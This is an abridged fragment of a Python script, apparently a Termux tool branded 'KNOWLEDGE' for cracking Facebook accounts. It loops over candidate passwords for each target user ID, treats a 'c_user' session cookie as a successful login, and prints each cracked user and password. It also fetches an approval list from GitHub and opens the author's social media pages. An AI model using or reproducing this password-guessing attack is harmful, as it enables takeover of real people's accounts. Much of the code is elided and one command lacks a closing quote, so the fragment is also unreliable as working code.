...
def main_apv():
    ...
    r1=requests.get("https://github.com/Hossin-Siddiki/New-2/blob/main/main.txt").text
...
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m KNOWLEDGE -2-0                  \033[1;31m        │
...
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢʀᴏᴜᴘ]\033[1;31m   ➟  \033[1;32mKNOWLEDGE  TERMUX COMMAND \033[1;37m {\033[1;36mKNOWLEDGE \033[1;37m} \033[1;31m     │
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[KNOWLEDGE ]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [KNOWLEDGE -OK 💥] {user} | {pw}")
...
def dupcutter():
	...
	os.system("xdg-open https://m.me/Md.SajibSarderOfficial)
	time.sleep(3)
	R()
def yt():
	logo()
	os.system("xdg-open https://www.facebook.com/KNOWLEDGE .OFFICIAL.ACCOUNT")
	time.sleep(3)
	R()
